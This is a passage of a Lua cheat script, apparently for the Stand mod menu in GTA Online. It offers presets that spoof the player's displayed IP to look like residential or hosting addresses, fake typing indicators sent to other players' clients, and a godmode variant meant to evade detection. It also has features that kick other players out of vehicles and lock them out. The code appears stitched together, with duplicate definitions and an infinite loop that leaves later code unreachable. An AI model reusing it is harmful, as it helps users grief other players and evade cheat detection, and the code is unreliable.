	menu.action(tempestpresets, "Tempest Hosting (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.255." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (RU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(127, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(0, 127)))
	end)

	menu.divider(spoofpresets, "Residential IP Presets")

	menu.action(spoofpresets, "Russia", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "109.252." .. tostring(math.random(40, 45)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "92.100." .. tostring(math.random(178, 182)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217.107." .. tostring(math.random(82, 98)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "95.24." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "China", {}, "", function()
		menu.trigger_commands("spoofedip " .. "42.123." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Australia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.168." .. tostring(math.random(40, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Chicago", {}, "", function()
		menu.trigger_commands("spoofedip " .. "73.110." .. tostring(math.random(149, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Baltimore", {}, "", function()
		menu.trigger_commands("spoofedip " .. "69.67." .. tostring(math.random(80, 95)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Texas", {}, "AT&T / IBM", function()
		menu.trigger_commands("spoofedip " .. "198.81.193." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Germany", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "84.56." .. tostring(math.random(218, 231)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "46.223." .. tostring(math.random(234, 251)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "93." .. tostring(math.random(192, 255)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "89.14." .. tostring(math.random(120, 124)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Italy", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "5.89." .. tostring(math.random(190, 197)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.200." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Netherlands", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "217.123." .. tostring(math.random(124, 125)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(100, 105)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "139.156." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "94.212." .. tostring(math.random(40, 47)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "France", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.10." .. tostring(math.random(134, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "United Kingdom", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "81.109." .. tostring(math.random(120, 130)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.33." .. tostring(math.random(88, 90)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "2.217." .. tostring(math.random(20, 30)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "86.0." .. tostring(math.random(54, 60)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Ireland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.203." .. tostring(math.random(0, 10)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Switzerland", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "85.0." .. tostring(math.random(41, 43)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "84.73." .. tostring(math.random(0, 115)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Austria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "194.166." .. tostring(math.random(250, 252)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Denmark", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "83.92." .. tostring(math.random(121, 124)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "87.104." .. tostring(math.random(64, 127)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Belgium", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.111." .. tostring(math.random(2, 4)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Spain", {}, "", function()
		menu.trigger_commands("spoofedip " .. "93.176." .. tostring(math.random(154, 155)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Portugal", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.61." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Norway", {}, "", function()
		menu.trigger_commands("spoofedip " .. "80.213." .. tostring(math.random(174, 181)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Finland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "88.113." .. tostring(math.random(64, 83)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Sweden", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "78.72." .. tostring(math.random(240, 245)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "151.252." .. tostring(math.random(128, 172)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Slovakia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.64." .. tostring(math.random(50, 55)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Romania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.117." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Poland", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "178.36." .. tostring(math.random(221, 229)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "193.17." .. tostring(math.random(174, 174)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(96, 99)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Czech Republic", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.91." .. tostring(math.random(164, 166)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Bulgaria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.154." .. tostring(math.random(162, 164)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Slovenia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "77.111." .. tostring(math.random(53, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Croatia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.133." .. tostring(math.random(132, 135)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Albania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.106." .. tostring(math.random(160, 191)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Lithuania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.140." .. tostring(math.random(13, 13)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Hungary", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.2." .. tostring(math.random(137, 137)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Greece", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.85." .. tostring(math.random(227, 227)) .. "." .. tostring(math.random(0, 255)))
	end)

ColorRepo = menu.list(misc, "Color Repository", {"colorrepo"}, "", function(); end)
BasicColors = menu.list(ColorRepo, "Basic Colors", {}, "", function(); end)
SecondaryColors = menu.list(ColorRepo, "Secondary Colors", {}, "", function(); end)

menu.action(BasicColors, "Red", {"red"}, "Copies a red hex value to your clipboard", function()
	util.copy_to_clipboard("ff0000")
end)

menu.action(BasicColors, "Green", {"green"}, "Copies a green hex value to your clipboard", function()
	util.copy_to_clipboard("00ff00")
end)

menu.action(BasicColors, "Blue", {"blue"}, "Copies a blue hex value to your clipboard", function()
	util.copy_to_clipboard("0000ff")
end)

menu.action(BasicColors, "Yellow", {"yellow"}, "Copies a yellow hex value to your clipboard", function()
	util.copy_to_clipboard("ffff00")
end)

menu.action(BasicColors, "Purple", {"purple"}, "Copies a purple hex value to your clipboard", function()
	util.copy_to_clipboard("800080")
end)

menu.action(BasicColors, "Orange", {"orange"}, "Copies an orange hex value to your clipboard", function()
	util.copy_to_clipboard("ffa500")
end)

menu.action(BasicColors, "White", {"white"}, "Copies a white hex value to your clipboard", function()
	util.copy_to_clipboard("ffffff")
end)

menu.action(BasicColors, "Black", {"black"}, "Copies a black hex value to your clipboard", function()
	util.copy_to_clipboard("000000")
end)

menu.action(SecondaryColors, "Magenta", {"magenta"}, "Magenta color for magenta menu", function()
	util.copy_to_clipboard("ff00FF")
end)

menu.action(SecondaryColors, "CEO of Crash", {"ceoofcrash"}, "The color I personally use, in case you wanted it", function()
	util.copy_to_clipboard("00ffa8")
end)

menu.toggle(misc,"Alternate 'Godmode'", {"godmode2"}, "Sets your max health really high and turns on autoheal. May bypass some menus' godmode detection due to your entity not being truly invincible.", function(on)  
	local me = players.user()   
	local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(me)
	if on then
		PED.SET_PED_MAX_HEALTH(PlayerPed,  90000)
		menu.trigger_commands("godmode off")
		menu.trigger_commands("demigodmode on")
		menu.trigger_commands("gracefulness on")
		menu.trigger_commands("paralock on")

	else
		PED.SET_PED_MAX_HEALTH(PlayerPed, 328)
		menu.trigger_commands("demigodmode off")
		notification("you may want to turn normal godmode back on again :)", colors.pink)
	end
end)

--[[menu.toggle(misc,"Player Bar", {"playerbar"}, "Turns on an overlay with a list of names and tags based on certain flags", function(on)
	if on then
		playerbar = true
	else
		playerbar = false
	end
end, false)]]

joining = false
menu.toggle(misc, "Player Joining Notifications", {}, "", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

menu.action(misc, "Fix Casino Heist", {}, "If you've bricked your casino heist by not doing the scoping mission, give this a try :)", function()
	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_POI"), 0, true)
	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_ACCESSPOINTS"), 0, true)
end)


faketype = menu.list(misc, "Spoof Typing indicator", {}, "", function(); end)

menu.action(faketype, "Start Fake Typing", {}, "Will show a typing indicator above your nickname and also make other menus think that you're typing in chat", function()
	menu.trigger_commands("hidetyping off")
	for pids = 0, 31 do
		if players.exists(pids) and pids ~= players.user() then
			send_script_event(747270864, pids, {players.user(), pids, 6769})
		end
	end
end)

menu.action(faketype, "Stop Fake Typing", {}, "", function()
	for pids = 0, 31 do
		if players.exists(pids) and pids ~= players.user() then
			send_script_event(-990958325, pids, {players.user(), pids, 7556})
		end
	end
end)

menu.toggle(faketype, "Anti-Type", {}, "AKA 'Suppress Typing Indicator', hides the fact that you're typing", function(on)
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)


notification("Currupt Script has been successfully loaded!", colors.pink)

async_http.init('pastebin.com', '/raw/j8iZnWjV', function(authver)
	if tonumber(authver) ~= version then -- why the fuck do i have to tonumber this when its literally already a number :waitwhat:
		util.toast(version .. " " .. authver)
		notification("Your using the BEST version of Currupt Script  available!", colors.pink)
		menu.hyperlink(menu.my_root(), "Join Kwengz Server! #KWENGZ-IS-KING  #CANDY-FAX", "https://discord.gg/Rwxjd7QbdH")
	end
end, function()
	notification("Failed to check for updates.", colors.pink)
end)
async_http.dispatch()


local InitialPlayersList = players.list(true, true, true) -- Obtain list of players from Stand API
for i=1, #InitialPlayersList do -- Loop through the received player list
	GenerateFeatures(InitialPlayersList[i]) -- Generate Features for every player
end
InitialPlayersList = nil -- Discard the table as it is no longer needed (optional; most beginners will not do this)

players.on_join(function(pid)
	while true do
		if joining then
			notification(PLAYER.GET_PLAYER_NAME(pid) .. " joined", colors.pink)
		end
		util.yield()
	end
end)

players.on_join(GenerateFeatures)
players.on_leave(update_leave)
players.on_join(update_join)
--util.on_stop(cleanup)

--for vehicle chaos
util.create_thread(function()
	while true do
		if (chaos) then
			vehicles = entities.get_all_vehicles_as_handles()
			cur_players = players.list(true,true,true)
			for k,v in pairs(vehicles) do
				driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(v, -1)
				if(PED.GET_PED_TYPE(driver) > 4) then
					VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(v, false, true)
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(v, speed)
					VEHICLE.SET_VEHICLE_GRAVITY(v, gravity)
				end
			end
		end
		util.yield()
	end
end)

	-- for car drifting
util.create_thread(function()
	while true do
		if drift then
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
		end
		util.yield()
	end
end)



--for oppressor blacklist
util.create_thread(function()
	while true do
		if kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("oppressor2")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield()
	end
end)

--[[
default = {
	["r"] = 255/255,
	["g"] = 255/255,
	["b"] = 255/255,
	["a"] = 255/255
} 
god = { -- need to find memory address
	["r"] = 255/255,
	["g"] = 175/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
interior = { -- done
	["r"] = 150/255,
	["g"] = 150/255,
	["b"] = 150/255,
	["a"] = 255/255
} 
otr = { -- done
	["r"] = 0/255,
	["g"] = 255/255,
	["b"] = 255/255,
	["a"] = 255/255
}
host = {
	["r"] = 255/255,
	["g"] = 200/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
dead = {
	["r"] = 175/255,
	["g"] = 100/255,
	["b"] = 100/255,
	["a"] = 255/255
} 
modder = {
	["r"] = 255/255,
	["g"] = 0/255,
	["b"] = 0/255,
	["a"] = 255/255
}  
friend = {
	["r"] = 0/255,
	["g"] = 255/255,
	["b"] = 0/255,
	["a"] = 255/255
}
spectating = {
	["r"] = 255/255,
	["g"] = 0/255,
	["b"] = 255/255,
	["a"] = 255/255
}


playerbar = false
util.create_thread(function() -- player bar
	while true do
		if playerbar then
			local PlayersList = players.list(true, true, true) 
			if #PlayersList < 11 then
				draw_box(0, 0, 1, 0.02, 0.5)
			elseif #PlayersList < 21 then
				draw_box(0, 0, 1, 0.036, 0.5)
			elseif #PlayersList < 31 then
				draw_box(0, 0, 1, 0.055, 0.5)
			else
				draw_box(0, 0, 1, 0.07, 0.5)
			end
			local posx = 0.001
			local posy = 0.001

			for _, pid in pairs (PlayersList) do 
				if true then
					local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
					local PlayerVehicle = PED.GET_VEHICLE_PED_IS_IN(PlayerPed, false)
					local color = default
					local tag = ""
					local getotr = memory.script_global(2689156 + (1 + (pid * 453)) + 209)
					local PlayerName = PLAYER.GET_PLAYER_NAME(pid)
					PlayerHandle = memory.alloc(13*4)
					NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, PlayerHandle, 13)
					
					if players.is_godmode(pid) then 
						tag = tag .. "[G]"
						color = god
					end
					if players.is_in_interior(pid) then
						tag = tag .. "[I]"
						color = interior
					end
					if memory.read_int(getotr) ==  1 then
						tag = tag .. "[O]"
						color = otr
					end
					if players.get_script_host() == pid then
						tag = tag .. "[SH]"
						color = host
					end
					if players.get_host() == pid then
						tag = tag .. "[H]"
						color = host
					end
					if PLAYER.IS_PLAYER_DEAD(pid) then
						tag = tag .. "[D]"
						color = dead
					end
					if players.is_marked_as_modder(pid) then
						tag = tag .. "[M]"
						color = modder
					end
					if NETWORK.NETWORK_IS_FRIEND(PlayerHandle) then
						tag = tag .. "[F]"
						color = friend
					end
					memory.free(PlayerHandle)

					directx.draw_text(posx, posy, PlayerName .. " " .. tag, ALIGN_TOP_LEFT, 0.4, color)
					posx = posx + 0.1
					if posx > 0.95 then
						posy = posy + 0.0175
						posx = 0.001
					end
				end
			end
		end
		util.yield()
	end
end)
]]

-- object ghosting
util.create_thread(function()
	while true do
		if objectghosting then
			local PlayerPed = PLAYER.GET_PLAYER_PED(players.user())
			local PedVehicle = PED.GET_VEHICLE_PED_IS_USING(PlayerPed)
			if PED.IS_PED_IN_ANY_VEHICLE(PlayerPed) then
				local collision = entities.get_all_objects_as_handles()
				for i = 1, #collision do
					ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(collision[i], PedVehicle, false)
					ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(PedVehicle, collision[i], false)    -- unfortunately theres no way to force collision to reenable afaik so you just have to wait it out and travel to a new area which loads new objects
				end
			end
		end
	util.yield(500)
	end
end)

require("natives-1627063482")
menu.toggle(menu.my_root(),"Ghost All Players",{"ghostall"},"This enables you to be 'passive' to all players\nbut without being passive",function(on)
	if on then
		for pid = 0,30 do
			if players.exists(pid) then
				NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid,true)
			end
		end
	else
		for pid = 0,30 do
			if players.exists(pid) then
				NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid,false)
			end
		end
	end 
end)

GenerateFeatures = function(pid)
menu.toggle(menu.player_root(pid),"Ghosting",{"ghost"},"This enables you to be 'passive' to the player\nbut without being passive",function(on)
    if on then
    NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid,true)
    else
    NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid,false)
    end 
end)
end

for pid = 0, 32 do
    if players.exists(pid) then
        GenerateFeatures(pid)
    end
end

util.require_natives(1651208000)
while true do
    if PAD.IS_CONTROL_PRESSED(1, 323) then
        while not STREAMING.HAS_ANIM_DICT_LOADED("random@mugging3") do
            STREAMING.REQUEST_ANIM_DICT("random@mugging3")
            util.yield(100)
        end
        if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
            WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), MISC.GET_HASH_KEY("WEAPON_UNARMED"), true)
            TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3, 3, -1, 51, 0, false, false, false)
            STREAMING.REMOVE_ANIM_DICT("random@mugging3")
            PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
        end
    end
    if PAD.IS_CONTROL_RELEASED(1, 323) and ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
        TASK.CLEAR_PED_SECONDARY_TASK(PLAYER.PLAYER_PED_ID())
        PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
    end
    util.yield()
end

util.on_stop(function()
	notification("Later pussy (Yawn)", colors.pink)
end)